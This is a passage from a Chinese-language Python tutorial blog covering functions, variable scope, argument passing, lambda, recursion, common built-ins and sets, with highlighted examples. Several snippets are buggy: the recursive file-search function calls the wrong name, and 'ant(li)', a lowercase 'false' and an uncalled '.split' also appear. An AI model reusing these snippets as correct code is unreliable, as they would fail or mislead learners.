<h6 id="组合使用"><a href="#组合使用" class="headerlink" title="#组合使用"></a>#组合使用</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">comx1</span>(<span class="params">*args,**kwargs</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(args)</span><br><span class="line">    <span class="built_in">print</span>(kwargs)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">comx1(age=<span class="number">18</span>)  </span><br><span class="line"></span><br><span class="line"><span class="comment">#可选参数必须放在关键字可选参数之前</span></span><br></pre></td></tr></table></figure>

<h5 id="0x03-函数返回值"><a href="#0x03-函数返回值" class="headerlink" title="0x03:函数返回值"></a>0x03:函数返回值</h5><p>*函数需要返回多个结果时，将要返回的值用逗号隔开，最终会返回一个包含所有返回值的元组</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.函数执行完以后会返回一个对象，如果函数的内部有return这个关键字，就可以返回实际的值，否则返回None</span><br><span class="line">2.可以返回任意类型，取决于return关键字后面的元素的类型</span><br><span class="line">3.给调用方返回数据</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sum</span>(<span class="params">a,b</span>):</span></span><br><span class="line">    <span class="built_in">sum</span> = a+b</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span></span><br><span class="line">a,b = <span class="built_in">map</span>(<span class="built_in">int</span>,<span class="built_in">input</span>().split())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;a+b=&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">sum</span>(a,b)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hanshu</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line"><span class="built_in">print</span>(hanshu())  <span class="comment">#以元组类型输出</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hanshu</span>():</span></span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;yuer&#x27;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(hanshu())  <span class="comment">#以字典类型输出</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(hanshu()))  <span class="comment">#字典</span></span><br></pre></td></tr></table></figure>

<h5 id="0x04-函数嵌套"><a href="#0x04-函数嵌套" class="headerlink" title="0x04:函数嵌套"></a>0x04:函数嵌套</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun1</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-----start------&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-----执行代码省略-----&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-----end-----&quot;</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun2</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-----start-----&quot;</span>)</span><br><span class="line">    fun1()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-----end-----&quot;</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#在调用fun2函数的时候会调用到fun1函数，fun1函数执行完毕之后继续执行之后的代码</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">函数分类：</span><br><span class="line">有参数无返回值</span><br><span class="line">有参数有返回值</span><br><span class="line">无参数无返回值</span><br><span class="line">无参数有返回值</span><br></pre></td></tr></table></figure>

<h3 id="5-函数进阶"><a href="#5-函数进阶" class="headerlink" title="5.函数进阶"></a>5.函数进阶</h3><h5 id="0x01-全局变量和局部变量"><a href="#0x01-全局变量和局部变量" class="headerlink" title="0x01:全局变量和局部变量"></a>0x01:全局变量和局部变量</h5><p><strong>局部变量：</strong></p>
<p>函数内部定义的变量（生效范围只在函数的内部，不同的函数可以定义相同的局部变量互不干扰，局部变量为了临时的保存数据，需要在函数中定义来进行存储</p>
<p><strong>全局变量：</strong></p>
<p>当全局变量和局部变量出现重复定义的时候，程序会优先执行使用函数内部定义的变量</p>
<p>如果在函数的内部想对全局变量进行修改的话，必须使用global关键字进行声明</p>
<p>修改全局变量：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="string">&#x27;yuer&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">changeGlobal</span>():</span></span><br><span class="line">	<span class="keyword">global</span> name</span><br><span class="line">	name = <span class="string">&#x27;cookie&#x27;</span></span><br><span class="line">	<span class="keyword">pass</span></span><br><span class="line">changeGlobal()</span><br><span class="line"><span class="built_in">print</span>(name)</span><br><span class="line">	</span><br></pre></td></tr></table></figure>

<h5 id="0x02-函数参数引用传值"><a href="#0x02-函数参数引用传值" class="headerlink" title="0x02:函数参数引用传值"></a>0x02:函数参数引用传值</h5><p><strong>不可变类型</strong></p>
<p>int str 元组</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;a的地址：&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">id</span>(a)))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;x的地址：&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">id</span>(x)))</span><br><span class="line">    x = <span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;x的地址：&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">id</span>(x)))</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">func(a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;a的地址：&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">id</span>(a)))</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># a的地址：140706376876304</span></span><br><span class="line"><span class="comment"># x的地址：140706376876304</span></span><br><span class="line"><span class="comment"># x的地址：140706376876336</span></span><br><span class="line"><span class="comment"># 1</span></span><br></pre></td></tr></table></figure>

<p><strong>可变类型</strong></p>
<p>字典 列表</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">listA = []</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">parms</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">id</span>(parms))</span><br><span class="line">    parms.append([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">id</span>(parms))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;内部的&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(parms))</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(listA))</span><br><span class="line">func(listA)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;外部的&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(listA))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2715138216456</span></span><br><span class="line"><span class="comment"># 2715138216456</span></span><br><span class="line"><span class="comment"># 2715138216456</span></span><br><span class="line"><span class="comment"># 内部的[[1, 2, 3, 4]] </span></span><br><span class="line"><span class="comment"># 外部的[[1, 2, 3, 4]]  数据同步变化</span></span><br></pre></td></tr></table></figure>

<p><strong>小结</strong></p>
<p>1.在python中 万物皆对象，在函数调用的时候，实参传递的就是对象的引用</p>
<p>2.更好的把控 在函数内部的处理是否会影响函数外部数据的变化</p>
<p>3.参数传递是通过对象引用来完成</p>
<h5 id="0x03-匿名函数"><a href="#0x03-匿名函数" class="headerlink" title="0x03:匿名函数"></a>0x03:匿名函数</h5><p>利用<code>lambda</code>关键字创建匿名函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lambda 参数1,参数2,参数3:执行代码语句</span><br></pre></td></tr></table></figure>

<p>1.没有名字的函数</p>
<p>2.匿名函数冒号后面的表达式有且只有一个（是表达式，不是语句</p>
<p>3.匿名函数自带<code>return</code></p>
<p>4.用变量接收匿名函数，用变量进行调用</p>
<p>5.但是只能是单个表达式，不是一个代码块，只是为了满足简单函数的场景，仅仅能封装有限的逻辑，复杂逻辑实现不了</p>
<p>eg：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="keyword">lambda</span> x,y:x+y</span><br><span class="line"><span class="built_in">print</span>(a(<span class="number">1</span>,<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">######</span></span><br><span class="line"></span><br><span class="line">d = <span class="keyword">lambda</span> a,b,c:a*b*c</span><br><span class="line"><span class="built_in">print</span>(d(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">######</span></span><br></pre></td></tr></table></figure>

<p>双分支变但分支：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b if a else c</span><br><span class="line">#如果a成立则返回b 否则返回c</span><br></pre></td></tr></table></figure>

<p>结合：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#直接调用</span></span><br><span class="line">jg = (<span class="keyword">lambda</span> x,y:x <span class="keyword">if</span> x&gt;y <span class="keyword">else</span> y)(<span class="number">1</span>,<span class="number">4</span>)</span><br><span class="line"><span class="built_in">print</span>(jg)</span><br></pre></td></tr></table></figure>

<h5 id="0x04-递归函数"><a href="#0x04-递归函数" class="headerlink" title="0x04:递归函数"></a>0x04:递归函数</h5><p>如果一个函数在内部不调用其他函数，而是自己本身的话，这个函数就是递归函数</p>
<p>递归函数必须有一个结束条件，否则递归无法结束</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 求阶乘</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x * func(x-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span>(func(<span class="number">5</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 模拟文件查找 实现树形结构的遍历</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os <span class="comment">#引入文件操作模块</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findFile</span>(<span class="params">file_path</span>):</span></span><br><span class="line">    listRs = os.listdir(file_path) <span class="comment">#得到该路径下所有的文件夹</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> listRs:</span><br><span class="line">        full_path = os.path.join(file_path, item)</span><br><span class="line">        <span class="comment">#获取完整的文件路径</span></span><br><span class="line">        <span class="keyword">if</span> os.path.isdir(full_path):</span><br><span class="line">        <span class="comment">#判断是否是文件夹</span></span><br><span class="line">        	file_path(full_path)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(item)</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        </span><br></pre></td></tr></table></figure>

<p>1.自己调用自己</p>
<p>2.必须有一个明确的结束条件</p>
<p>3.优点：逻辑简单，定义简单</p>
<p>4.缺点：容易导致栈溢出。内存资源紧张，甚至内存泄漏</p>
<h3 id="6-内置函数"><a href="#6-内置函数" class="headerlink" title="6.内置函数"></a>6.内置函数</h3><h5 id="0x01-数学运算"><a href="#0x01-数学运算" class="headerlink" title="0x01:数学运算"></a>0x01:数学运算</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">abs()  求绝对值函数</span><br><span class="line">返回数字的绝对值</span><br><span class="line"></span><br><span class="line">round()</span><br><span class="line">求近似值</span><br><span class="line"></span><br><span class="line">pow()</span><br><span class="line">求次方</span><br><span class="line"></span><br><span class="line">divmod()</span><br><span class="line">求商和余数</span><br><span class="line"></span><br><span class="line">max()</span><br><span class="line">min()</span><br><span class="line">最值</span><br><span class="line"></span><br><span class="line">sum()</span><br><span class="line">和</span><br><span class="line"></span><br><span class="line">eval()</span><br><span class="line">将字符串当作代码</span><br></pre></td></tr></table></figure>

<h5 id="0x02-类型转换"><a href="#0x02-类型转换" class="headerlink" title="0x02:类型转换"></a>0x02:类型转换</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#数据类型的转换</span><br><span class="line">int()</span><br><span class="line">float()</span><br><span class="line">str()</span><br><span class="line"></span><br><span class="line">#ascii码相互转换</span><br><span class="line">ord()</span><br><span class="line">chr() </span><br><span class="line"></span><br><span class="line">bool()</span><br><span class="line"></span><br><span class="line">bin()</span><br><span class="line">hex()</span><br><span class="line">oct() 转成八进制</span><br><span class="line"></span><br><span class="line">list() 元组转换成列表</span><br><span class="line">tuple()</span><br><span class="line">dict() 创建字典</span><br><span class="line"></span><br><span class="line">bytes()</span><br></pre></td></tr></table></figure>

<p><code>dict()</code>字典操作（主要用于创建字典</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#语法</span></span><br><span class="line"><span class="comment"># class dict(**kwarg)</span></span><br><span class="line"><span class="comment"># class dict(mapping,**kwarg)</span></span><br><span class="line"><span class="comment"># class dict(iterable,**kwarg)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#参数</span></span><br><span class="line"><span class="comment"># **kwarg  关键字</span></span><br><span class="line"><span class="comment"># mapping 元素的容器</span></span><br><span class="line"><span class="comment"># iterable 可迭代对象</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#返回值</span></span><br><span class="line"><span class="comment">#返回一个字典</span></span><br><span class="line"></span><br><span class="line">dic = <span class="built_in">dict</span>(name=<span class="string">&#x27;cookie&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(dic))</span><br><span class="line">dic.update(&#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;yuer&#x27;</span>&#125;)  <span class="comment">#更新数据或者增加数据</span></span><br><span class="line">dic[<span class="string">&#x27;age&#x27;</span>] = <span class="number">18</span></span><br><span class="line"><span class="built_in">print</span>(dic)</span><br></pre></td></tr></table></figure>

<p><code>bytes()</code>转为字节数组</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#语法</span></span><br><span class="line"><span class="comment"># class bytearray([source[,encoding]]])</span></span><br><span class="line"><span class="comment">#参数</span></span><br><span class="line"><span class="comment"># source 为整数，则返回一个长度为source的初始化数组</span></span><br><span class="line"><span class="comment">#        为字符串，则按照指定的encoding将字符串转换成字节序列</span></span><br><span class="line"><span class="comment">#        为可迭代类型，则元素必须为[0,255]中的整数</span></span><br><span class="line"><span class="comment">#        为与buffer接口一致的对象，则次对象也可以被用于初始化bytes</span></span><br><span class="line"><span class="comment">#        如果没有输入任何参数，默认就是初始化数组为0个元素</span></span><br><span class="line"><span class="comment">#返回值</span></span><br><span class="line"><span class="comment">#返回新字节数组</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(<span class="string">&#x27;w我like python&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure>

<h5 id="0x03-序列操作"><a href="#0x03-序列操作" class="headerlink" title="0x03:序列操作"></a>0x03:序列操作</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">all()</span><br><span class="line">any()</span><br><span class="line">sorted()</span><br><span class="line">reverse()</span><br><span class="line">range()</span><br><span class="line">zip()</span><br><span class="line">enumerate()</span><br></pre></td></tr></table></figure>

<p><code>all()</code>与的关系</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#用于判断给定的可迭代参数iterable中的所有元素是否都为TRUE，如果是返回True，否则返回False元素，除了是0，空，FALSE外都算TRUE</span></span><br><span class="line"><span class="comment">#函数等价于：</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">all</span>(<span class="params">iterable</span>):</span></span><br><span class="line">    <span class="keyword">for</span> element <span class="keyword">in</span> iterable:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> element:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">     <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#语法</span></span><br><span class="line"><span class="comment"># all(iterable)</span></span><br><span class="line"><span class="comment">#参数</span></span><br><span class="line"><span class="comment">#iterable 元组或者列表</span></span><br><span class="line"><span class="comment">#tip</span></span><br><span class="line"><span class="comment">#空元组、空列表返回值为True</span></span><br><span class="line"></span><br><span class="line">li = []</span><br><span class="line">tup = ()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">all</span>(li)) <span class="comment">#Trur</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">all</span>(li)) <span class="comment">#True</span></span><br><span class="line">li = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="literal">False</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">all</span>(li)) <span class="comment">#False</span></span><br><span class="line">tup = (<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">all</span>(tup)) <span class="comment">#False</span></span><br></pre></td></tr></table></figure>

<p><code>any()</code>或的关系</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#用于判断给定的可迭代参数iterable是否全部为False，则返回False，如果有一个True，则返回True</span></span><br><span class="line"><span class="comment">#函数等价于</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">any</span>(<span class="params">iterable</span>):</span></span><br><span class="line">    <span class="keyword">for</span> element <span class="keyword">in</span> iterable:</span><br><span class="line">        <span class="keyword">if</span> element:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">     <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#例子</span></span><br><span class="line">li = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">any</span>(li)) <span class="comment">#True</span></span><br><span class="line">li = [<span class="number">0</span>,<span class="literal">False</span>]</span><br><span class="line"><span class="built_in">print</span>(ant(li)) <span class="comment">#False</span></span><br><span class="line">li = [<span class="string">&#x27;&#x27;</span>,<span class="number">0</span>,false]</span><br></pre></td></tr></table></figure>

<p><code>sorted()</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#对所有可迭代的对象进行排序操作(list str tuple dict)</span></span><br><span class="line"><span class="comment">#和sort区别：</span></span><br><span class="line"><span class="comment">#sort是应用再list上的方法，sorted可以对所有可迭代对象进行排序操作</span></span><br><span class="line"><span class="comment">#list的sort方法返回的是对已经存在的列表进行操作，</span></span><br><span class="line">  <span class="comment">#而内建函数sorted方法返回的是一个新的list，而不是在原来的基础上进行的</span></span><br><span class="line"><span class="comment">#语法：</span></span><br><span class="line"><span class="comment"># sorted(iterable[,cmp[,key[,reverse]]])</span></span><br><span class="line"><span class="comment">#参数：</span></span><br><span class="line"><span class="comment">#cmp 比较函数，这个具有两个参数，参数的值都是从可迭代对象中取出，此函数必须遵守的规则为，大于则返回1，小于则返回-1，等于则返回0</span></span><br><span class="line"><span class="comment">#key 主要是用来进行比较的元素，只有一个参数，具体的函数的参数就是取自于可迭代对象中去，指定可迭代对象中的以恶搞元素来进行排序</span></span><br><span class="line"><span class="comment">#reverse 排序规则，reverse = True 降序，反之升序</span></span><br><span class="line"><span class="comment">#返回重新排序的列表</span></span><br><span class="line"></span><br><span class="line">li = [<span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">8</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sorted</span>(li))  <span class="comment">#[1, 2, 3, 5, 6, 8]</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sorted</span>(li,reverse=<span class="literal">True</span>)) <span class="comment">#[8, 6, 5, 3, 2, 1]</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sorted</span>(li,reverse=<span class="literal">False</span>)) <span class="comment">#[1, 2, 3, 5, 6, 8]</span></span><br><span class="line">li.sort()</span><br><span class="line"><span class="built_in">print</span>(li) <span class="comment">#[1, 2, 3, 5, 6, 8]</span></span><br></pre></td></tr></table></figure>

<p><code>reverse()</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 用于反向列表中的元素</span></span><br><span class="line"></span><br><span class="line">li = [<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>]</span><br><span class="line">li.reverse()</span><br><span class="line"><span class="built_in">print</span>(li)</span><br></pre></td></tr></table></figure>

<p><code>range()</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建一个整数列表，一般用在for循环中</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">range</span>(start,stop[,step])</span><br></pre></td></tr></table></figure>

<p><code>zip()</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 用来打包的</span></span><br><span class="line">a = <span class="built_in">zip</span>([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(a))</span><br><span class="line"><span class="comment"># [(1,&#x27;a&#x27;),(2,&#x27;b&#x27;),(3,&#x27;c&#x27;)]</span></span><br><span class="line"></span><br><span class="line">s1 = [<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>]</span><br><span class="line">s2 = [<span class="string">&#x27;你&#x27;</span>,<span class="string">&#x27;我&#x27;</span>,<span class="string">&#x27;他&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(<span class="built_in">zip</span>(s1,s2)))</span><br><span class="line"><span class="comment"># [(&#x27;a&#x27;, &#x27;你&#x27;), (&#x27;b&#x27;, &#x27;我&#x27;), (&#x27;c&#x27;, &#x27;他&#x27;)]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 不同序列中的数据根据索引一一对应，并组成元组，各个元组又组成一个列表，每个元组元素的个数由最短的序列决定</span></span><br></pre></td></tr></table></figure>

<p>例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printBookInfo</span>():</span></span><br><span class="line">    books = [] </span><br><span class="line">    <span class="built_in">id</span> = <span class="built_in">input</span>(<span class="string">&quot;请输入图书编号: &quot;</span>).split</span><br><span class="line">    bookName = <span class="built_in">input</span>(<span class="string">&quot;请输入书名:&quot;</span>)</span><br><span class="line">    bookPos = <span class="built_in">input</span>(<span class="string">&quot;请输入位置:&quot;</span>)</span><br><span class="line">    idList = <span class="built_in">id</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    bookNameList = bookName.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    posList = bookPos.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    bookInfo = <span class="built_in">zip</span>(idList, bookNameList, posList)</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> bookInfo:</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        遍历图书信息，进行存储</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        dictInfo = &#123;<span class="string">&#x27;编号&#x27;</span>:item[<span class="number">0</span>],<span class="string">&#x27;书名&#x27;</span>:item[<span class="number">1</span>],<span class="string">&#x27;位置&#x27;</span>:item[<span class="number">2</span>]&#125;</span><br><span class="line">        books.append(dictInfo)</span><br><span class="line">        <span class="comment">#将字典对象添加到list容器中</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> books:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">printBookInfo()</span><br></pre></td></tr></table></figure>

<p><code>enumerate()</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 用于将一个可遍历的数据对象组合为一个索引序列，同时列出数据和数据下标，一般用在for循环中</span></span><br><span class="line"><span class="comment"># enumerate(sequence,[start=0])</span></span><br><span class="line"></span><br><span class="line">li = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line"> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">enumerate</span>(li, start=<span class="number">0</span>):</span><br><span class="line">     <span class="built_in">print</span>(i) <span class="comment">#索引加元素的元组类型</span></span><br><span class="line"> <span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">enumerate</span>(li):</span><br><span class="line">       <span class="built_in">print</span>(i, j) <span class="comment">#分别输出对应的值</span></span><br><span class="line">dictA = &#123;&#125;</span><br><span class="line">dictA[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;cookie&#x27;</span></span><br><span class="line">dictA[<span class="string">&#x27;sex&#x27;</span>] = <span class="string">&#x27;female&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">enumerate</span>(dictA):</span><br><span class="line">    <span class="built_in">print</span>(i)  <span class="comment">#索引加键的元组类型</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">enumerate</span>(dictA):</span><br><span class="line">    <span class="comment">#遍历字典</span></span><br><span class="line">    <span class="built_in">print</span>(i, j, dictA[j])</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<h5 id="0x04-三元运算"><a href="#0x04-三元运算" class="headerlink" title="0x04:三元运算"></a>0x04:三元运算</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">result = 值1 if 条件 else 值2</span><br></pre></td></tr></table></figure>

<h5 id="0x05-set集合"><a href="#0x05-set集合" class="headerlink" title="0x05:set集合"></a>0x05:set集合</h5><p>set（集合）是python中的一种数据类型，是一个无序且不重复的元素集合</p>
<p>特点：</p>
<p>不支持索引和切片，是一个无序的且不重复的容器，类似于字典，但是只有key没有value</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#创建集合方式：</span></span><br><span class="line"></span><br><span class="line">set1 = &#123;<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">list1 = [<span class="number">1</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">5</span>]</span><br><span class="line">se2 = <span class="built_in">set</span>(list1)</span><br></pre></td></tr></table></figure>

<p><code>集合操作函数</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># add()</span></span><br><span class="line">set1 = <span class="built_in">set</span>()</span><br><span class="line">set1.add(<span class="string">&#x27;python&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(set1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># clear() 清空</span></span><br><span class="line">set1 = &#123;<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>&#125;</span><br><span class="line">set1.clear()</span><br><span class="line"><span class="built_in">print</span>(set1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># difference()  差集 set1中存在，set2中不存在</span></span><br><span class="line">set1 = &#123;<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>&#125;</span><br><span class="line">set2 = &#123;<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>&#125;</span><br><span class="line">set3 = set1.difference(set2)</span><br><span class="line"><span class="built_in">print</span>(set3)</span><br><span class="line"></span><br><span class="line"><span class="comment"># intersection() 交集</span></span><br><span class="line">set1 = &#123;<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>&#125;</span><br><span class="line">set2 = &#123;<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>&#125;</span><br><span class="line">set3 = set1.intersection(set1, set2)</span><br><span class="line"><span class="built_in">print</span>(set3)</span><br><span class="line"></span><br><span class="line"><span class="comment"># union()  并集</span></span><br><span class="line">set1 = &#123;<span 